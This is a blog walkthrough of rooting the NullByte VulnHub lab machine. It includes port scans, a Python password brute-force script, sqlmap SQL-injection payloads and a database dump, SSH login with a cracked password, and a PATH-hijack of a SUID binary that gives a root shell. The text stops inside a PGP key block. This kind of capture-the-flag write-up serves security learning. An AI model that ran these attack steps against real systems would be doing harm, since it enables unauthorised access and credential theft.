
<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="True" name="HandheldFriendly"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="" name="robots"/>
<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
<meta content="maggick" name="author"/>
<meta content="After the Acid challenge I was really motivated. Therefore I give a look at another vulnhub machine I had already download since a while: NullByte." name="description"/>
<meta content="security, vulnhub, challenge, linux" name="keywords"/>
<meta content="maggick's logs" property="og:site_name">
<meta content="Vulnhub - NullByte" property="og:title"/>
<meta content="After the Acid challenge I was really motivated. Therefore I give a look at another vulnhub machine I had already download since a while: NullByte." property="og:description"/>
<meta content="en_US" property="og:locale"/>
<meta content="../../2015/09/vulnhub-nullbyte.html" property="og:url"/>
<meta content="article" property="og:type"/>
<meta content="2015-09-11 16:55:00+02:00" property="article:published_time"/>
<meta content="" property="article:modified_time"/>
<meta content="../../author/maggick.html" property="article:author"/>
<meta content="security" property="article:section">
<meta content="security" property="article:tag"/>
<meta content="vulnhub" property="article:tag"/>
<meta content="challenge" property="article:tag"/>
<meta content="linux" property="article:tag"/>
<meta content="https://maggick.fr/media/image.png" property="og:image"/>
<title>maggick's logs – Vulnhub - NullByte</title>
</meta></meta></head>
<body>
<aside>
<div>
<a href="../../">
<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
</a>
<h1>
<a href="../../">maggick's logs</a>
</h1>
<p>Offensive security tales</p>
<nav>
<ul class="list">
<li>
<a href="../../pages/about.html" target="_self">
                  About
                </a>
</li>
<li>
<a href="../../pages/notes.html" target="_self">
                  Notes
                </a>
</li>
<li>
<a href="../../pages/tools.html" target="_self">
                  Tools
                </a>
</li>
</ul>
</nav>
<ul class="social">
<li>
<a class="sc-github" href="https://github.com/maggick" target="_blank">
<i class="fab fa-github"></i>
</a>
</li>
<li>
<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
<i class="fab fa-twitter"></i>
</a>
</li>
<li>
<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
<i class="fab fa-stack-overflow"></i>
</a>
</li>
<li>
<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
<i class="fas fa-rss"></i>
</a>
</li>
</ul>
</div>
</aside>
<main>
<nav>
<a href="../../">Home</a>
<a href="/archives.html">Archives</a>
<a href="/categories.html">Categories</a>
<a href="/tags.html">Tags</a>
<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
</nav>
<article class="single">
<header>
<h1 id="vulnhub-nullbyte">Vulnhub - NullByte</h1>
<p>
      Posted on 11 Sep 2015 in <a href="../../category/security.html">security</a>

        • 5 min read
    </p>
</header>
<div>
<p><img alt="NullByte" class="align-left" src="/media/2015.09/main.gif" width="162"/></p>
<p>After the <a href="/2015/09/vulnhub-acid.html">Acid</a> challenge I was
really motivated. Therefore I give a look at another vulnhub machine I had already
download since a while:
<a href="https://www.vulnhub.com/entry/nullbyte-1,126/">NullByte</a>.</p>
<p>The goal is to root the server.</p>
<h2>Host discovery</h2>
<p>As always, we start with the host discovery with <a href="http://nmap.org">nmap</a>,
<a href="https://cirt.net/Nikto2">nikto</a> and
<a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a>:</p>
<h3>nmap</h3>
<div class="highlight"><pre><span></span><code>nmap 192.168.0.20 -p0-65535 -A -oA nmap
# Nmap 6.47 scan initiated Thu Sep 10 10:01:29 2015 as: nmap -p0-65535 -A -oA nmap 192.168.0.20
Nmap scan report for 192.168.0.20
Host is up (0.0089s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Null Byte 00 - level 1
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          34677/tcp  status
|_  100024  1          37785/udp  status
777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
34677/tcp open  status  1 (RPC #100024)
MAC Address: A0:88:B4:C7:17:2C (Intel Corporate)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.11 - 3.14
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div>
<p>There is an HTTP server on the port 80 and an ssh service on port 777.</p>
<h2>Exploitation</h2>
<p>The web server display a picture with a simple message. Neither nikto nor
dirbuster give us some lead.  Let us run <code>exiftool</code> on the picture:</p>
<h3>main.gif</h3>
<p><img alt="main.gif" class="image-process-article-image" src="/media/2015.09/derivatives/article-image/main.gif"/></p>
<p>The comment filed is interesting:</p>
<div class="highlight"><pre><span></span><code>ExifTool Version Number         : 8.60
File Name                       : main.gif
Directory                       : .
File Size                       : 16 kB
File Modification Date/Time     : 2015:09:10 10:07:39+02:00
File Permissions                : rw-r--r--
File Type                       : GIF
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-): kzMb5nVYJw
Image Size                      : 235x302
</code></pre></div>
<p>What can we do with that?</p>
<h3>kzMb5nVYJw</h3>
<p>If we put this at the end of our url with land on another page. Dirbuster will
never have find something like that!</p>
<p>It is a simple web page asking us for a key. When looking at the page code we
notice:</p>
<blockquote>
<p>&lt;!-- this form isn't connected to mysql, password ain't that complex --!&gt;</p>
</blockquote>
<p>If there is no SQL injection and the password is simple we need to bruteforce it.
I am not a huge fan of bruteforce but I wrote a simple script that use one of my
password dictionary (mostly common word).</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">url</span> <span class="o">=</span> <span class="s1">'http://192.168.0.20/kzMb5nVYJw/index.php'</span>
<span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s1">'/usr/share/dict/cracklib-small'</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span>
<span class="n">password</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'key'</span><span class="p">:</span><span class="n">password</span><span class="p">}</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">)</span>
<span class="k">while</span> <span class="s1">'invalid'</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
    <span class="n">password</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'key'</span><span class="p">:</span><span class="n">password</span><span class="p">}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</code></pre></div>
<p>The password was "elite" and by entering it, we land on a new page.</p>
<h3>420search.php</h3>
<p>The <code>420search.php</code> page let us query for an user. If we search 'plop' we got:</p>
<blockquote>
<p>Fetched data successfully</p>
</blockquote>
<p>If we search nothing we got:</p>
<p>:::text
   EMP ID :1
   EMP NAME : ramses
   EMP POSITION :</p>
<hr/>
<p>EMP ID :2
   EMP NAME : isis
   EMP POSITION : employee</p>
<hr/>
<p>Fetched data successfully</p>
<p>This time it is probably a SQL injection as there is no mention against it in
the source code :D. If we introduce a double quote we got:</p>
<blockquote>
<p>Could not get data: You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the right syntax to use near
'%"' at line 1</p>
</blockquote>
<p>It looks like an SQL injection.</p>
<h3>SQLi</h3>
<p>Let us launch <a href="http://sqlmap.org">sqlmap</a>:</p>
<div class="highlight"><pre><span></span><code><span class="o">[</span><span class="n">maggick@rootine sqlmap</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="n">python2</span><span class="w"> </span><span class="n">sqlmap</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s1">'http://192.168.0.20/kzMb5nVYJw/420search.php?usrtosearch=plop'</span><span class="w"></span>
<span class="w">         </span><span class="n">_</span><span class="w"></span>
<span class="w"> </span><span class="n">___</span><span class="w"> </span><span class="n">___</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="n">_____</span><span class="w"> </span><span class="n">___</span><span class="w"> </span><span class="n">___</span><span class="w">  </span><span class="err">{</span><span class="mf">1.0</span><span class="o">-</span><span class="n">dev</span><span class="o">-</span><span class="n">e8f87bf</span><span class="err">}</span><span class="w"></span>
<span class="o">|</span><span class="n">_</span><span class="w"> </span><span class="o">-|</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="p">.</span><span class="s1">'| . |</span>
<span class="s1">|___|_  |_|_|_|_|__,|  _|</span>
<span class="s1">      |_|           |_|   http://sqlmap.org</span>

<span class="s1">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span><span class="n">s</span><span class="w"> </span><span class="n">responsibility</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">obey</span><span class="w"> </span><span class="ow">all</span><span class="w"> </span><span class="n">applicable</span><span class="w"> </span><span class="k">local</span><span class="p">,</span><span class="w"> </span><span class="k">state</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">federal</span><span class="w"> </span><span class="n">laws</span><span class="p">.</span><span class="w"> </span><span class="n">Developers</span><span class="w"> </span><span class="n">assume</span><span class="w"> </span><span class="k">no</span><span class="w"> </span><span class="n">liability</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">responsible</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="ow">any</span><span class="w"> </span><span class="n">misuse</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">damage</span><span class="w"> </span><span class="n">caused</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">program</span><span class="w"></span>

<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">starting</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">15</span><span class="err">:</span><span class="mi">25</span><span class="err">:</span><span class="mi">23</span><span class="w"></span>

<span class="o">[</span><span class="n">15:25:23</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">resuming</span><span class="w"> </span><span class="n">back</span><span class="o">-</span><span class="k">end</span><span class="w"> </span><span class="n">DBMS</span><span class="w"> </span><span class="s1">'mysql'</span><span class="w"> </span>
<span class="o">[</span><span class="n">15:25:23</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="k">connection</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">URL</span><span class="w"></span>
<span class="n">sqlmap</span><span class="w"> </span><span class="n">identified</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">injection</span><span class="w"> </span><span class="n">points</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">total</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="n">HTTP</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="nl">requests</span><span class="p">:</span><span class="w"></span>
<span class="o">---</span><span class="w"></span>
<span class="k">Parameter</span><span class="err">:</span><span class="w"> </span><span class="n">usrtosearch</span><span class="w"> </span><span class="p">(</span><span class="k">GET</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="nl">Type</span><span class="p">:</span><span class="w"> </span><span class="k">boolean</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="n">blind</span><span class="w"></span>
<span class="w">    </span><span class="nl">Title</span><span class="p">:</span><span class="w"> </span><span class="ow">OR</span><span class="w"> </span><span class="k">boolean</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="n">blind</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="k">HAVING</span><span class="w"> </span><span class="n">clause</span><span class="w"> </span><span class="p">(</span><span class="n">MySQL</span><span class="w"> </span><span class="n">comment</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="nl">Payload</span><span class="p">:</span><span class="w"> </span><span class="n">usrtosearch</span><span class="o">=-</span><span class="mi">8936</span><span class="ss">" OR 8832=8832#</span>

<span class="ss">    Type: AND/OR time-based blind</span>
<span class="ss">    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT - comment)</span>
<span class="ss">    Payload: usrtosearch=plop"</span><span class="w"> </span><span class="ow">AND</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="p">(</span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">)))</span><span class="n">bhRc</span><span class="p">)</span><span class="err">#</span><span class="w"></span>

<span class="w">    </span><span class="nl">Type</span><span class="p">:</span><span class="w"> </span><span class="ow">UNION</span><span class="w"> </span><span class="n">query</span><span class="w"></span>
<span class="w">    </span><span class="nl">Title</span><span class="p">:</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="ow">UNION</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="p">(</span><span class="k">NULL</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="n">columns</span><span class="w"></span>
<span class="w">    </span><span class="nl">Payload</span><span class="p">:</span><span class="w"> </span><span class="n">usrtosearch</span><span class="o">=</span><span class="n">plop</span><span class="err">"</span><span class="w"> </span><span class="ow">UNION</span><span class="w"> </span><span class="ow">ALL</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="nf">CONCAT</span><span class="p">(</span><span class="mh">0x71706b7871</span><span class="p">,</span><span class="mh">0x5355686d62645446514a</span><span class="p">,</span><span class="mh">0x7162716271</span><span class="p">),</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="err">#</span><span class="w"></span>
<span class="o">---</span><span class="w"></span>
<span class="o">[</span><span class="n">15:25:23</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">back</span><span class="o">-</span><span class="k">end</span><span class="w"> </span><span class="n">DBMS</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">MySQL</span><span class="w"></span>
<span class="n">web</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">operating</span><span class="w"> </span><span class="k">system</span><span class="err">:</span><span class="w"> </span><span class="n">Linux</span><span class="w"> </span><span class="n">Debian</span><span class="w"></span>
<span class="n">web</span><span class="w"> </span><span class="n">application</span><span class="w"> </span><span class="nl">technology</span><span class="p">:</span><span class="w"> </span><span class="n">Apache</span><span class="w"> </span><span class="mf">2.4.10</span><span class="w"></span>
<span class="n">back</span><span class="o">-</span><span class="k">end</span><span class="w"> </span><span class="nl">DBMS</span><span class="p">:</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="mf">5.0.12</span><span class="w"></span>
<span class="o">[</span><span class="n">15:25:23</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">fetched</span><span class="w"> </span><span class="k">data</span><span class="w"> </span><span class="n">logged</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="nc">text</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="k">under</span><span class="w"> </span><span class="s1">'/home/maggick/.sqlmap/output/192.168.0.20'</span><span class="w"></span>

<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">shutting</span><span class="w"> </span><span class="n">down</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">15</span><span class="err">:</span><span class="mi">25</span><span class="err">:</span><span class="mi">23</span><span class="w"></span>
</code></pre></div>
<p><code>python2 sqlmap.py -u 'http://192.168.0.20/kzMb5nVYJw/420search.php?usrtosearch=plo' --current-db</code>
got us the name of the current databse: <strong>seth</strong>.</p>
<p><code>python2 sqlmap.py -u 'http://192.168.0.20/kzMb5nVYJw/420search.php?usrtosearch=plo' -D seth --tables</code>
got us the list of the tables in the database <strong>seth</strong>. There is only one table : <strong>users</strong>. Let us drop it:</p>
<div class="highlight"><pre><span></span><code>$python2 sqlmap.py -u 'http://192.168.0.20/kzMb5nVYJw/420search.php?usrtosearch=plop' -D seth --dump
+----+---------------------------------------------+--------+------------+
| id | pass                                        | user   | position   |
+----+---------------------------------------------+--------+------------+
| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | &lt;blank&gt;    |
| 2  | --not allowed--                             | isis   | employee   |
+----+---------------------------------------------+--------+------------+
</code></pre></div>
<p>It seems that ramses pass(word) is base64 encoded. After decoding, we got:
<strong>c6d6bd7ebf806f43c76acc3681703b81</strong> which looks like a md5 hash. A simple
google search give us the associated password: <strong>omega</strong>.</p>
<p>We have a username and a password. We have also seen a ssh port at the nmap
stage.</p>
<h2>Shell exploitation</h2>
<h3>ssh</h3>
<p>We try to connect to the non standard ssh port as ramses:</p>
<div class="highlight"><pre><span></span><code>$ ssh 192.168.0.20 -p 777 -lramses
ramses@192.168.0.20's password:
omega
</code></pre></div>
<p>And it works.</p>
<h3>Privilege elevation</h3>
<p>We got a shell as a user now we need privilege escalation to become root. After
trying <code>sudo su</code> we look at the <code>bash_history</code>:</p>
<div class="highlight"><pre><span></span><code><span class="n">ramses</span><span class="err">@</span><span class="n">NullByte</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">.</span><span class="n">bash_history</span><span class="w"></span>
<span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"></span>
<span class="n">su</span><span class="w"> </span><span class="n">eric</span><span class="w"></span>
<span class="n">exit</span><span class="w"></span>
<span class="n">ls</span><span class="w"></span>
<span class="n">clear</span><span class="w"></span>
<span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="w"></span>
<span class="n">cd</span><span class="w"> </span><span class="n">backup</span><span class="o">/</span><span class="w"></span>
<span class="n">ls</span><span class="w"></span>
<span class="o">./</span><span class="n">procwatch</span><span class="w"></span>
<span class="n">clear</span><span class="w"></span>
<span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"></span>
<span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="w"></span>
<span class="n">ls</span><span class="w"></span>
<span class="n">exit</span><span class="w"></span>
</code></pre></div>
<p>Let see the <code>/var/www/backup/</code> folder:</p>
<div class="highlight"><pre><span></span><code><span class="n">ramses</span><span class="err">@</span><span class="n">NullByte</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">backup</span><span class="o">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"></span>
<span class="n">total</span><span class="w"> </span><span class="mi">12</span><span class="w"></span>
<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">4932</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="mi">01</span><span class="p">:</span><span class="mi">29</span><span class="w"> </span><span class="n">procwatch</span><span class="w"></span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">   </span><span class="mi">28</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="mi">01</span><span class="p">:</span><span class="mi">36</span><span class="w"> </span><span class="n">readme</span><span class="o">.</span><span class="n">txt</span><span class="w"></span>
</code></pre></div>
<p>Interesting, we read the readme.txt file:</p>
<div class="highlight"><pre><span></span><code><span class="n">ramses</span><span class="err">@</span><span class="n">NullByte</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">backup</span><span class="o">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">readme</span><span class="o">.</span><span class="n">txt</span><span class="w"></span>
<span class="n">I</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">fix</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">mess</span><span class="o">...</span><span class="w"></span>
</code></pre></div>
<p>We execute <code>procwatch</code>:</p>
<p>ramses@NullByte:/var/www/backup$ ./procwatch
  PID TTY          TIME CMD
 1785 pts/0    00:00:00 procwatch
 1786 pts/0    00:00:00 sh
 1787 pts/0    00:00:00 ps</p>
<p>Seems like a ps, probably executing the command itself. Moreover it is own by root
with the <a href="https://en.wikipedia.org/wiki/Setuid">suid</a> set (the s in the <code>ls -l</code>),
meaning we execute this program with root privileges.</p>
<p>One classic vulnerability when a program executes another one is to use the PATH
environment variable to execute a command of our choice instead of the command
wanted by the program.</p>
<p>First of all we create a file with the command we want to execute and name it <code>ps</code>:</p>
<div class="highlight"><pre><span></span><code>ramses@NullByte:/var/www/backup$ echo /bin/sh &gt; ~/ps
</code></pre></div>
<p>We give the execution right to this file:</p>
<div class="highlight"><pre><span></span><code>ramses@NullByte:/var/www/backup$ chmod +x ~/ps
</code></pre></div>
<p>We add the directory where we created this file to our PATH:</p>
<div class="highlight"><pre><span></span><code>ramses@NullByte:/var/www/backup$ export PATH=~/:$PATH
</code></pre></div>
<p>We execute the original program:</p>
<div class="highlight"><pre><span></span><code>ramses@NullByte:/var/www/backup$ ./procwatch
</code></pre></div>
<p>Magic happened, we got a root shell:</p>
<div class="highlight"><pre><span></span><code># whoami
root
</code></pre></div>
<p>Now we just need to search the flag:</p>
<div class="highlight"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="w"></span>
<span class="n">proof</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
<span class="err">#</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proof</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
<span class="n">adf11c7a9e6523e630aaf3b9b7acb51d</span><span class="w"></span>

<span class="n">It</span><span class="w"> </span><span class="n">seems</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">pwned</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">box</span><span class="p">,</span><span class="w"> </span><span class="n">congrats</span><span class="p">.</span><span class="w"></span>
<span class="n">Now</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">done</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">wanna</span><span class="w"> </span><span class="n">talk</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">you</span><span class="p">.</span><span class="w"> </span><span class="k">Write</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">walk</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">mail</span><span class="w"> </span><span class="k">at</span><span class="w"></span>
<span class="n">xly0n</span><span class="nv">@sigaint</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="n">attach</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">walk</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">proof</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
<span class="k">If</span><span class="w"> </span><span class="n">sigaint</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">down</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">mail</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">nbsly0n</span><span class="nv">@gmail</span><span class="p">.</span><span class="n">com</span><span class="w"></span>


<span class="k">USE</span><span class="w"> </span><span class="n">THIS</span><span class="w"> </span><span class="n">PGP</span><span class="w"> </span><span class="k">PUBLIC</span><span class="w"> </span><span class="k">KEY</span><span class="w"></span>

<span class="o">-----</span><span class="k">BEGIN</span><span class="w"> </span><span class="n">PGP</span><span class="w"> </span><span class="k">PUBLIC</span><span class="w"> </span><span class="k">KEY</span><span class="w"> </span><span class="n">BLOCK</span><span class="o">-----</span><span class="w"></span>
<span class="nl">Version</span><span class="p">:</span><span class="w"> </span><span class="n">BCPG</span><span class="w"> </span><span class="n">C</span><span class="err">#</span><span class="w"> </span><span class="n">v1</span><span class="mf">.6.1.0</span><span class="w"></span>

<span class="n">mQENBFW9BX8BCACVNFJtV4KeFa</span><span class="o">/</span><span class="n">TgJZgNefJQ</span><span class="o">+</span><span class="n">fD1</span><span class="o">+</span><span class="n">LNEGnv5rw3uSV</span><span class="o">+</span><span class="n">jWigpxrJ</span><span class="w"></span>
<span class="n">Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT</span><span class="w"></span>
<span class="n">e4QU3gZPd</span><span class="o">/</span><span class="n">VibPhzbJC</span><span class="o">/</span><span class="n">pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1</span><span class="o">/</span><span class="n">xhSRTprq</span><span class="w"></span>
<span class="n">Cu7OyNC8</span><span class="o">+</span><span class="n">HKu</span><span class="o">/</span><span class="n">NpJ7j8mxDTLrvoD</span><span class="o">+</span><span class="n">hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK</span><span class="w"></span>
<span class="o">+</span><span class="n">z9pmlOJ5Xfhc2xx</span><span class="o">+</span><span class="n">WHtST53Ewk8D</span><span class="o">+</span><span class="n">Hjn</span><span class="o">+</span><span class="n">mh4s9</span><span class="o">/</span><span class="n">pjppdpMFUhr1poXPsI2HTWNe</span><span class="w"></span>
<span class="n">YcvzcQHwzXj6hvtcXlJj</span><span class="o">+</span><span class="n">yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu</span><span class="w"></span>
<span class="n">Y29tiQEcBBABAgAGBQJVvQV</span><span class="o">/</span><span class="n">AAoJENDZ4VE7RHERJVkH</span><span class="o">/</span><span class="n">RUeh6qn116Lf5mAScNS</span><span class="w"></span>
<span class="n">HhWTUulxIllPmnOPxB9</span><span class="o">/</span><span class="n">yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q</span><span class="w"></span>
<span class="n">m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1</span><span class="o">+</span><span class="n">MI2CCJL44Q</span><span class="o">/</span><span class="n">J5654vIGn</span><span class="w"></span>
